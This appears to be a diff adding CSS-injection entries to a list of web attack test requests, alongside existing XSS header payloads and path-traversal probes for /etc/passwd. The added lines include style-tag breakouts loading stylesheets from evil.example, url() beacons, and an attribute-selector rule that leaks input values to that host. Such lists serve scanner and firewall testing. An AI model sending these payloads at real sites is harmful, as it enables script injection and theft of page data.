@@ -183,6 +183,17 @@ GET / header="X-Forwarded-Host: javascript:alert(1)"
 GET / header="Referer: data:text/html,<script>alert(1)</script>"
 GET / header="Cookie: theme=<script>alert(1)</script>"
 
+# --- CSS injection: style-context breakout, scriptable CSS, remote stylesheet
+#     loads, and attribute-selector url() data exfiltration ---
+GET /?theme=%3C/style%3E%3Clink%20rel=stylesheet%20href=//evil.example/x.css%3E
+POST /profile body="bio=<style>@import url(//evil.example/x.css);</style>"
+GET /?css=@import%20%22https://evil.example/x.css%22
+GET /?bg=url(%22https://evil.example/collect%22)
+GET /?t=url(%27javascript:alert(1)%27)
+POST /comment body="<div style=\"width:expression(alert(1))\">"
+GET /?q=%5Bvalue%5E=%22a%22%5D%7Bbackground:url(//evil.example/a)%7D
+GET /static/theme.css header="Referer: </style><link rel=stylesheet href=//evil.example/x.css>"
+
 # --- Path traversal and local file inclusion ---
 GET /?file=../../etc/passwd
 GET /?file=..%2F..%2Fetc%2Fpasswd
